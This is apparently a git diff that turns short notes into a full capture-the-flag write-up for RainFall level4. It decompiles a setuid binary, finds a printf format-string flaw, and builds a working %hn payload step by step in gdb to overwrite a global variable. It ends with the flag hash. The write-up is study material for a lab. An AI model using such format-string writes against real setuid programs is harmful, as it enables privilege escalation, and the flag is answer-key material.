@@ -1,19 +1,217 @@
-=> Same exercise as level3
-=> This time the value to overwrite is bigger than 2 bytes (0x1025544)
-=> We need to overwrite 2 times
+# Level 4
 
-symbol table:
-08049810 g     O .bss	00000004              m
-m <= 0x1025544
+## General Informations 
 
-2 addresses = 8
-5544 =  21828 - 258 = 21570
-102 = 258 - 8 = 250
+**Path** : `/home/user/level4/level4` </br>
+**File** : 
+```
+level4: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8cb2bdaa7daab1347b36aaf1c98d49529c605db, not stripped
+```
+**Permissions**: `-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4`
 
-2 first bytes	= 250 + 8	= 258	= (0x102)
-2 last bytes	= 21828 - 258	= 21570 = (0x5544
+## Static analysis
 
--> We use h to write 2 bytes (short)
+After decompiling the binary with ghidra we get the pseudo code below: 
 
-python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%250X"+ "%13$n" + "%21570x" + "%12$hn"' | ./level4 
+```
+void p(char *param_1)
+{
+  printf(param_1);
+  return;
+}
 
+void n(void)
+{
+  char local_20c [520];
+  
+  fgets(local_20c,0x200,stdin);
+  p(local_20c);
+  if (m == 0x1025544) {
+    system("/bin/cat /home/user/level5/.pass");
+  }
+  return;
+}
+
+void main(void)
+{
+  n();
+  return;
+}
+```
+
+We have three functions in the binary:
+- `main`, which simply calls the n function.
+- `n`, where the main logic resides. It first uses the secure `fgets` function to read user input into a 520-byte buffer, then calls p with this buffer. </br>
+There's also a conditional block that is only executed if the global variable `m` is equal to `0x1025544` (`m` is a symbol present in the ELF).
+This block is particularly interesting because it displays the flag for the current level using the command `system("/bin/cat /home/user/level5/.pass");`
+- `p`, which simply prints the buffer passed from `n`.
+
+## Vulnerability found 
+
+The printf function is vulnerable to a format string exploit. </br>
+This vulnerability can be exploited to read or write arbitrary memory, and potentially execute malicious code. The issue arises from using unchecked user input directly as the format string parameter, which controls how the data is formatted and displayed. </br>
+[exploit-101-format-strings](https://axcheron.github.io/exploit-101-format-strings/)
+
+## Dynamic Analysis
+
+We saw previously that we can write data to an arbitrary address. Let's try the same strategy with a larger value, such as `0x1025544`, `16930116` in decimal.
+
+The address of `m` is `0x08049810`
+```
+> readelf -s level4
+...
+    66: 08049810     4 OBJECT  GLOBAL DEFAULT   25 m
+...
+```
+
+To begin, we need to determine the padding from the base stack address.
+```
+(gdb) r <<< $(python -c 'print "AAAA" + "%p " * 15')
+...
+AAAA0xb7ff26b0 0xbffff664 0xb7fd0ff4 (nil) (nil) 0xbffff628 0x804848d 0xbffff420 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025 0x70252070 0x20702520
+```
+
+Our input is located at the 12th position on the stack.
+```
+(gdb) r <<< $(python -c 'print "AAAA" + "%12$p"')
+...
+AAAA0x41414141
+```
+
+Now, let's try to write `(16930116 - 4)` characters to the address of `m`
+
+```
+level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "A"*(16930116-4) + "%12$n"' | ./level4 
+...
+  File "<string>", line 1, in <module>
+IOError: [Errno 32] Broken pipe
+```
+
+In the best-case scenario, the program doesn’t display the flag. In the worst-case scenario, we encounter an error like `IOError: Broken pipe`.
+
+Sometimes, we can't write large numbers all at once because the pipe or the program can't handle them — especially if the value exceeds an int.
+One way to resolve this is by splitting the value into byte-sized chunks.
+The `%hn` format specifier allows us to write a short (2 bytes) to a given address. We will therefore split the target value into two distinct shorts.
+
+To illustrate how to slice an int into two shorts, we will set a breakpoint just after the `printf` call.
+```
+(gdb) b *0x08048455
+```
+
+After running the program once, we can choose a stack address to test our payload. Let’s pick `0xbffff3f0`.
+```
+(gdb) r <<< $(python -c 'print "\xf0\xf3\xff\xbf" + "%12$n"')
+...
+Breakpoint 1, 0x08048455 in p ()
+(gdb) x/16x $esp 
+0xbffff3f0:	0x00000004	0xb7ff26b0	0xbffff664	0xb7fd0ff4
+...
+```
+We observe that the 4 bytes at `0xbffff3f0` are replaced by the value `0x00000004`.
+This time, we'll test with the `%hn` specifier to write a short instead of a full 4-byte integer.
+```
+(gdb) r <<< $(python -c 'print "\xf0\xf3\xff\xbf" + "%12$hn"')
+...
+Breakpoint 1, 0x08048455 in p ()
+(gdb) x/16x $esp 
+0xbffff3f0:	0xbfff0004	0xb7ff26b0	0xbffff664	0xb7fd0ff4
+...
+```
+
+Now, we see that only the first 2 bytes at `0xbffff3f0` are overwritten with the value 4.
+If we add 2 to our address (`0xbffff3f0 → 0xbffff3f2`), we can target the higher or lower 2 bytes of the original 4-byte address.
+
+```
+(gdb) r <<< $(python -c 'print "\xf2\xf3\xff\xbf" + "%12$hn"')
+...
+Breakpoint 1, 0x08048455 in p ()
+(gdb) x/16x $esp 
+0xbffff3f0:	0x0004f420	0xb7ff26b0	0xbffff664	0xb7fd0ff4
+...
+```
+
+Now let’s apply this technique to the actual `m` address:
+The address of `m` is `0x08049810`, and the value we want to write is `0x01025544`.
+We'll split this value into two shorts:
+- `0x5544` → `21828` in decimal (lower 2 bytes)
+- `0x0102` → `258` in decimal (higher 2 bytes)
+
+We'll write the two target addresses first, one after the other.
+```
+python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08"'
+```
+
+Then we add the specifiers `%hn` with the padding of the addresses
+```
+python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%12$hn" + "%13$hn"'
+```
+
+If the first address is at position 12 on the stack, the second will be at position 13.
+When we execute this, both addresses hold the value 8.
+```
+(gdb) r <<< $(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%12$hn" + "%13$hn"')
+...
+Breakpoint 1, 0x08048455 in p ()
+(gdb) x 0x08049810
+0x8049810 <m>:	0x00080008
+```
+
+We start by writing the smallest value first — `0x0102` (258) — to avoid overwriting a lower value after writing a higher one.
+```
+(gdb) r <<< $(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%12$hn" + "%250X" + "%13$hn"')
+...
+Breakpoint 1, 0x08048455 in p ()
+(gdb) x 0x08049810
+0x8049810 <m>:	0x01020008
+```
+
+Why use `%250x` ? Because we want to write a total of 258 characters, and we’ve already written 8 characters (two 4-byte addresses = 8 bytes), so we only need to print 250 more characters before using `%hn`.
+
+For the second short (`0x5544` or `21828`), we subtract what we’ve already written (258) → 21828 - 258 = 21570.
+So we write `%21570x` before the second `%hn`.
+
+```
+(gdb) r <<< $(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%250X" + "%13$hn" + "%21570X" + "%12$hn"')
+...
+```
+
+It works ! Let's continue.
+
+```
+(gdb) c
+Continuing.
+/bin/cat: /home/user/level5/.pass: Permission denied
+[Inferior 1 (process 3720) exited normally]
+```
+
+The program displays a permission error. </br>
+This happens because GDB runs the program with different permissions than the original binary file.
+If we try running it outside of GDB, it should work correctly.
+
+## Payload construction 
+
+1. We write the 2 addresses at the beginning of our input: </br>
+`python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08"'`
+2. We add the specifiers for both of the addresses: </br>
+`python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%13$hn" + "%12$hn"'`
+3. Then we add the characters to obtain the wanted values on each addresses: </br>
+`python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%250X" + "%13$hn" + "%21570X" + "%12$hn"'`
+
+```
+python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%250X" + "%13$hn" + "%21570X" + "%12$hn"'
+```
+
+## Demonstration 
+
+```
+level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%250X" + "%13$hn" + "%21570X" + "%12$hn"' | ./level4 
+...
+BFFFF684
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
+
+## Flag 
+
+```
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
